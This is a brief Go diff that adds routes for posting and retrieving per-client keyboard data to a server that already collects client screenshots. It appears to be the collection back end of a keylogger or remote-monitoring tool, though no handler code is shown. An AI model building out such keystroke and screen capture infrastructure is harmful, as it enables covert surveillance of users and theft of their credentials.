@@ -40,7 +40,10 @@ func main() {
 	router.POST("/disconnect", utils.DisconnectClient)
 	router.POST("/post_screen", utils.PostClientScreenshot)
 	router.GET("/get_and_remove_screen/:client_addr", utils.FetchClientLastScreen)
-
+	
+	router.POST("/post_kbdata", utils.AddClientKeyboardData)
+	router.GET("/get_kbdata/:client_addr", utils.GetClientKeyboardData)
+	
 	log.Println("Server started!")
 	router.Run(fmt.Sprintf(":%d", PORT));
 }
